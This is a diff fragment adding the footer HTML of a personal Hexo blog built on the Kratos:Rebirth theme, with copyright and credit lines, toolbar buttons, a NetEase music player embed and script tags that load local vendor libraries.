+                        <li><a target="_blank" rel="nofollow" href="https://github.com/rippleQAQ"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2023 ripple 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by rippleQAQ.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
